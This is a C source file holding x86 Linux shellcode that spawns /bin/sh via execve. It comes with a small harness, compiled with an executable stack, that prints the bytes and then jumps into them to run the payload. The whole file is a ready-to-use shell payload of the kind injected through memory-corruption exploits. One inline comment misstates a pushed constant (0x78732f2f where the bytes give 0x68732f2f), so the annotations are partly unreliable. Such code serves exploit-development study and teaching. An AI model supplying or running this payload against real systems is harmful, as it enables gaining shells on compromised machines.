#include <stdio.h>

// gcc -z execstack -o shellcode shellcode.c

char shellcode[] = "\x31\xc0"			// xor eax, eax
                   "\x6a\x01"			// push 0x1
                   "\x83\x34\x24\x01"		// sub DWORD PTR [esp], 1
                   "\x68\x2f\x2f\x73\x68"	// push 0x78732f2f
                   "\x68\x2f\x62\x69\x6e"	// push 0x6e69622f
                   "\x89\xe3"			// mov ebx, esp
                   "\x89\xc1"			// mov ecx, eax
                   "\x89\xc2"			// mov edx, eax
                   "\xb0\x0b"			// mov al, 0xb
                   "\xcd\x80"			// int 0x80
                   "\x31\xc0"			// xor eax, eax
                   "\x40"			// inc eax
                   "\xcd\x80";			// int 0x80


int main() {
	printf("shellcode len: %d\n", sizeof(shellcode)-1);
	printf("shellcode: ");
        for (int i = 0; i < sizeof(shellcode)-1; ++i)
                printf("\\x%02hhx", shellcode[i]);
        printf("\n");
	(*(void(*)()) shellcode)();
	return 0;
}
